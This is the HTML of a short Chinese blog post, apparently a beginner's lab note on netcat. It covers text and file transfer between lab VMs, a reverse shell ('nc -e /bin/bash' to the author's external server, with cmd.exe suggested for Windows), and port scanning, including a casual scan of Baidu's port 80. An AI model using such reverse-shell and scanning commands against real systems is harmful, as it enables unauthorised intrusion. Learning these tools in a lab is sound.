@@ -1,0 +1,206 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>netcat的使用 | Light</title><meta name="author" content="Lade captain"><meta name="copyright" content="Lade captain"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="实验环境netcat简称nc,也被誉为网络安全界的瑞士军刀，正好这两天在很多大佬那学了点nc的操作，写篇文章纪念一下。 首先是nc的版本：这台虚拟机的是kali系统，ip是192.168.17.131。 123──(root㉿kali)-[~]└─# nc -h [v1.10-48]  另一台虚拟机为ubuntu系统，ip是192.168.10.10 12root@ubuntu:~# nc -hO">
+<meta property="og:type" content="article">
+<meta property="og:title" content="netcat的使用">
+<meta property="og:url" content="http://www.funseek.fun/2025/05/01/netcat%E7%9A%84%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="Light">
+<meta property="og:description" content="实验环境netcat简称nc,也被誉为网络安全界的瑞士军刀，正好这两天在很多大佬那学了点nc的操作，写篇文章纪念一下。 首先是nc的版本：这台虚拟机的是kali系统，ip是192.168.17.131。 123──(root㉿kali)-[~]└─# nc -h [v1.10-48]  另一台虚拟机为ubuntu系统，ip是192.168.10.10 12root@ubuntu:~# nc -hO">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ts4.tc.mm.bing.net/th/id/OIP-C.hun_dCoupI6wtivQXSuJCgHaD7?rs=1&pid=ImgDetMain">
+<meta property="article:published_time" content="2025-05-01T02:17:49.000Z">
+<meta property="article:modified_time" content="2025-05-01T02:53:02.856Z">
+<meta property="article:author" content="Lade captain">
+<meta property="article:tag" content="网络安全学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ts4.tc.mm.bing.net/th/id/OIP-C.hun_dCoupI6wtivQXSuJCgHaD7?rs=1&pid=ImgDetMain"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "netcat的使用",
+  "url": "http://www.funseek.fun/2025/05/01/netcat%E7%9A%84%E4%BD%BF%E7%94%A8/",
+  "image": "https://ts4.tc.mm.bing.net/th/id/OIP-C.hun_dCoupI6wtivQXSuJCgHaD7?rs=1&pid=ImgDetMain",
+  "datePublished": "2025-05-01T02:17:49.000Z",
+  "dateModified": "2025-05-01T02:53:02.856Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Lade captain",
+      "url": "http://www.funseek.fun/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://imgs.design006.com/Upload/test/Design006_20230428122339421.png"><link rel="canonical" href="http://www.funseek.fun/2025/05/01/netcat%E7%9A%84%E4%BD%BF%E7%94%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'netcat的使用',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://cdn.wallpapersafari.com/62/45/WB3xjD.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://imgs.design006.com/Upload/test/Design006_20230428122339421.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ts4.tc.mm.bing.net/th/id/OIP-C.hun_dCoupI6wtivQXSuJCgHaD7?rs=1&amp;pid=ImgDetMain);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Light</span></a><a class="nav-page-title" href="/"><span class="site-name">netcat的使用</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">netcat的使用<a class="post-edit-link" href="https://github.com/ladecaptain/ladecaptain.github.io_posts/netcat的使用.md" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-01T02:17:49.000Z" title="发表于 2025-05-01 10:17:49">2025-05-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-01T02:53:02.856Z" title="更新于 2025-05-01 10:53:02">2025-05-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>netcat简称nc,也被誉为网络安全界的瑞士军刀，正好这两天在很多大佬那学了点nc的操作，写篇文章纪念一下。</p>
+<p>首先是nc的版本：<br>这台虚拟机的是kali系统，ip是192.168.17.131。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─# nc -h </span><br><span class="line">[v1.10-48]</span><br></pre></td></tr></table></figure>
+
+<p>另一台虚拟机为ubuntu系统，ip是192.168.10.10</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# nc -h</span><br><span class="line">OpenBSD netcat (Debian patchlevel 1.218-4ubuntu1)</span><br></pre></td></tr></table></figure>
+
+<p>然后是外网的一台服务器，用的是centos系统，ip我将用Cip代替。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@CentOS ~]# nc -h</span><br><span class="line">1.229-1</span><br></pre></td></tr></table></figure>
+
+<p>下面开始正式操作：</p>
+<h2 id="文字传输"><a href="#文字传输" class="headerlink" title="文字传输"></a>文字传输</h2><h3 id="基本文字传输"><a href="#基本文字传输" class="headerlink" title="基本文字传输"></a>基本文字传输</h3><p>-首先在kali上开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 222</span><br></pre></td></tr></table></figure>
+
+<p>-然后在ubuntu上尝试连接kali的222端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vn 192.168.17.131 222</span><br></pre></td></tr></table></figure>
+
+<p>可以看到连接成功了，接着输入一些文字。<br><img src="https://img.picui.cn/free/2025/04/27/680d95c01fcca.png"></p>
+<p>在kali上可以看到监听到的信息。<br><img src="https://img.picui.cn/free/2025/04/27/680d95bfc72a1.png"></p>
+<p>双方只要有一个键入ctrl+c就可以断开连接。</p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>基于同样的原理，只需要利用重定向符，将文件内容重定向到nc的标准输入，就可以完成文件传输。<br><img src="https://img.picui.cn/free/2025/04/27/680d9df43fafc.png"><br><img src="https://img.picui.cn/free/2025/04/27/680d9df49c1d8.png"></p>
+<h2 id="命令交互"><a href="#命令交互" class="headerlink" title="命令交互"></a>命令交互</h2><h3 id="基本命令交互"><a href="#基本命令交互" class="headerlink" title="基本命令交互"></a>基本命令交互</h3><p>-首先在kali上开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -p 222</span><br></pre></td></tr></table></figure>
+
+<p>-然后在ubuntu上尝试连接kali的222端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vn 192.168.17.131 222</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以进行命令交互了<br><img src="https://img.picui.cn/free/2025/04/27/680da0e7443d2.png"><br><img src="https://img.picui.cn/free/2025/04/27/680da0e72ac44.png"></p>
+<h2 id="内网弹-shell"><a href="#内网弹-shell" class="headerlink" title="内网弹 shell"></a>内网弹 shell</h2><p>-首先在服务器Centos上开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 2333</span><br></pre></td></tr></table></figure>
+<p>-然后在kali上尝试连接服务器的2333端口,这里的Cip是服务器的ip</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash Cip 2333</span><br></pre></td></tr></table></figure>
+<p>然后就可以进行命令交互了<br><img src="https://img.picui.cn/free/2025/05/01/6812d3f6c5963.png"><br><img src="https://img.picui.cn/free/2025/05/01/6812d480131b1.png"></p>
+<p>内网弹shell的原理是利用nc的-e参数，连接后执行指定的命令，这里是&#x2F;bin&#x2F;bash。</p>
+<p>同理，如果内网的虚拟机是windows系统，就可以将&#x2F;bin&#x2F;bash替换为cmd.exe。</p>
+<h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><p>nc的端口扫描并不是其主要功能，这里简单介绍一下</p>
+<h3 id="扫描单个端口"><a href="#扫描单个端口" class="headerlink" title="扫描单个端口"></a>扫描单个端口</h3><p>扫描成功后可获取改端口的一些信息，如扫描80端口，可获取其一些服务器信息。（如果它没有做任何防护的话，大胆扫描了一下百度的80端口，结果啥都没得到…）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v Targetip 端口</span><br></pre></td></tr></table></figure>
+<h3 id="扫描多个端口"><a href="#扫描多个端口" class="headerlink" title="扫描多个端口"></a>扫描多个端口</h3><p>速度会比较慢</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v -z Targetip 1-100</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://www.funseek.fun">Lade captain</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://www.funseek.fun/2025/05/01/netcat%E7%9A%84%E4%BD%BF%E7%94%A8/">http://www.funseek.fun/2025/05/01/netcat%E7%9A%84%E4%BD%BF%E7%94%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://www.funseek.fun" target="_blank">Light</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">网络安全学习</a></div><div class="post-share"><div class="social-share" data-image="https://ts4.tc.mm.bing.net/th/id/OIP-C.hun_dCoupI6wtivQXSuJCgHaD7?rs=1&amp;pid=ImgDetMain" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/04/11/welcome-to-my-website/" title="建站成功啦！"><img class="cover" src="https://cdn.mycplus.com/mycplus/wp-content/uploads/2017/12/hello_world.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">建站成功啦！</div></div><div class="info-2"><div class="info-item-1">欢迎来到我的博客网站！我是一个热爱技术和写作的博主，我将在这个这里分享我的技术经验，生活感悟。希望能通过这个博客平台和大家互相交流。 </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://imgs.design006.com/Upload/test/Design006_20230428122339421.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Lade captain</div><div class="author-info-description">美好总在不经意间出现</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ladecaptain"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ladecaptain" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:731600015@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这个人很懒，暂时没有更新公告。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E5%AD%97%E4%BC%A0%E8%BE%93"><span class="toc-number">2.</span> <span class="toc-text">文字传输</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%96%87%E5%AD%97%E4%BC%A0%E8%BE%93"><span class="toc-number">2.1.</span> <span class="toc-text">基本文字传输</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">2.2.</span> <span class="toc-text">文件传输</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E4%BA%A4%E4%BA%92"><span class="toc-number">3.</span> <span class="toc-text">命令交互</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BA%A4%E4%BA%92"><span class="toc-number">3.1.</span> <span class="toc-text">基本命令交互</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%BC%B9-shell"><span class="toc-number">4.</span> <span class="toc-text">内网弹 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="toc-number">5.</span> <span class="toc-text">扫描端口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%8D%95%E4%B8%AA%E7%AB%AF%E5%8F%A3"><span class="toc-number">5.1.</span> <span class="toc-text">扫描单个端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%A4%9A%E4%B8%AA%E7%AB%AF%E5%8F%A3"><span class="toc-number">5.2.</span> <span class="toc-text">扫描多个端口</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/05/01/netcat%E7%9A%84%E4%BD%BF%E7%94%A8/" title="netcat的使用"><img src="https://ts4.tc.mm.bing.net/th/id/OIP-C.hun_dCoupI6wtivQXSuJCgHaD7?rs=1&amp;pid=ImgDetMain" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="netcat的使用"/></a><div class="content"><a class="title" href="/2025/05/01/netcat%E7%9A%84%E4%BD%BF%E7%94%A8/" title="netcat的使用">netcat的使用</a><time datetime="2025-05-01T02:17:49.000Z" title="发表于 2025-05-01 10:17:49">2025-05-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/11/welcome-to-my-website/" title="建站成功啦！"><img src="https://cdn.mycplus.com/mycplus/wp-content/uploads/2017/12/hello_world.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="建站成功啦！"/></a><div class="content"><a class="title" href="/2025/04/11/welcome-to-my-website/" title="建站成功啦！">建站成功啦！</a><time datetime="2025-04-11T10:17:49.000Z" title="发表于 2025-04-11 18:17:49">2025-04-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://ts4.tc.mm.bing.net/th/id/OIP-C.hun_dCoupI6wtivQXSuJCgHaD7?rs=1&amp;pid=ImgDetMain);"><div id="footer-wrap"><div class="copyright">&copy;2025 By Lade captain</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">备案号：赣ICP备2025055215号-1</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
